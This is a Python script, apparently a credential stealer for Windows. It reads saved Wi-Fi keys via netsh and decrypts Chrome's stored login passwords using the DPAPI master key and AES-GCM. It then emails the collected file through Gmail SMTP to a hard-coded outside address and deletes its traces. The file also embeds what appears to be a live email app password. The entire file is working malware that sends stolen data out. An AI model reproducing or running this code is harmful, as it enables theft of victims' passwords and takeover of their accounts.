from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from Crypto.Cipher import AES
from email import encoders
import smtplib, ssl, sys, os
import subprocess as sp
import win32crypt
import sqlite3
import base64
import shutil
import json

wifi_db = 'wifi.db'
path_local = r'AppData\Local\Google\Chrome\User Data\Local State'
path_login = r'AppData\Local\Google\Chrome\User Data\default\Login Data'

ADDR = 'xablau.mpx@gmail.com'
msg = MIMEMultipart()
msg['Subject'] = 'Hacking'
msg['From'] = ADDR
msg['To'] = 'vinibruno99@gmail.com'

def getPassword():
    with open(os.environ['userprofile'] + os.sep + path_local, 'r', encoding='utf-8') as get_path:
        local = get_path.read()
        local = json.loads(local)
    key_master = base64.b64decode(local['os_crypt']["encrypted_key"])
    key_master = key_master[5:]
    key_master = win32crypt.CryptUnprotectData(key_master, None, None, None, 0)[1]
    return key_master

def decryptPayload(secret, payload):
    return secret.decrypt(payload)

def onSecret(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decryptPassword(buff, key_master):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        secret = onSecret(key_master, iv)
        decrypted_passwd = decryptPayload(secret, payload)
        decrypted_passwd = decrypted_passwd[:-16].decode()
        return decrypted_passwd
    except Exception as err:
        return f'1: {err}'

def Get_Wifi_Password():
    try:
        get_wifi = sp.check_output(['netsh', 'wlan', 'show', 'profiles'], encoding='cp860')
        for network in get_wifi.split('\n'):
            if 'Todos os Perfis de Usuários' in network:
                two_point = network.find(':')
                info_network = network[two_point+2:]
                all_networks = sp.check_output(
                    ['netsh', 'wlan', 'show', 'profiles', info_network, 'key', '=', 'clear'], encoding='cp860'
                    )
                
                for passwords in all_networks.split('\n'):
                    if 'Nome SSID' in passwords:
                        two_point1 = network.find(':')
                        names = passwords[two_point1+2:]

                    if 'Conteúdo da Chave' in passwords:
                        two_point2 = network.find(':')
                        passwd = passwords[two_point2+2:]
                        get_network = f'Rede: {names}\nSenha: {passwd}\n\n'
                        with open('password.csv', 'a') as wifi:
                            wifi.write(f'{get_network}')
                        wifi.close()
    except:
        pass
        
def Send_Email():
    try:
        file = open('password.csv', 'rb')
        att = MIMEBase('application', 'octet-stream')
        att.set_payload(file.read())
        encoders.encode_base64(att)
        att.add_header(
            'Content-Disposition', 'attachment; filename=password.csv'
        )
        file.close()
        msg.attach(att)

    except Exception as error:
        return error
    
    context = ssl.create_default_context()
    with smtplib.SMTP(host='smtp.gmail.com', port=587) as smtp:
        try:
            smtp.starttls(context=context)
            smtp.login(msg['From'], 'anwuekaywkgmsueb')
            smtp.sendmail(msg['From'], msg['To'], msg.as_string())
            return 'Email Send Sucess'

        except Exception as err:
            return err
        
if __name__ == '__main__':
    if not sys.platform == 'linux':
        Get_Wifi_Password()
        key_master = getPassword()
        login_db = os.environ['USERPROFILE'] + os.sep + path_login
        shutil.copy2(login_db, wifi_db)
        connect = sqlite3.connect(wifi_db)
        cursor = connect.cursor()

        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for item in cursor.fetchall():
            url = item[0]
            username = item[1]
            encrypted_password = item[2]
            decrypted_password = decryptPassword(encrypted_password, key_master)
            save = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n\n"
            with open('password.csv', 'a') as passwords:
                passwords.write(save)
            passwords.close()

        Send_Email()
        cursor.close()
        connect.close()

        try:
            os.remove(wifi_db)
            os.remove('password.csv')
        except Exception as err_db:
            print(err_db)
    else:
        print('System Not Compatible')
